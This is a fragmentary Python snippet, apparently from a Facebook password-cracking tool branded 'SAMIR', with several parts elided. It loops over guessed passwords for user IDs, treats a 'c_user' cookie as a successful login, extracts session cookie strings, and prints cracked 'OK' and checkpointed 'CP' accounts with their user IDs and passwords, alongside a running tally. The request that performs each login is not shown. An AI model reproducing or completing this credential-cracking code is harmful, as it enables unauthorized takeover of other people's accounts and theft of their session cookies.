    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;96m[\033[1;92m[SAMIR-OK💛]\033[1;96m[❤️]\033[1;92m' +uid+'\033[1;92m●'+ps+'\033[1;94m<=>'+tahunng(uid))
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;96m[SAMIR-CP]\033[1;93m[😪]\033[1;96m'+uid+'='+ps+'\033[1;93m<=>'+tahunng(uid))
                print ('\033[1;32m[‎🍁]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print ('')
                print('\033[1;93m [\033[1;96mSAMIR-OK💚\033[1;93m]\033[1;91m = \033[1;96m\033[1;92m' +uid+' | '+ps+'\033[1;91m = \033[1;96m '+tahunng(uid))
        ...
        sys.stdout.write('\r%s[SAMIR-KING💥]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
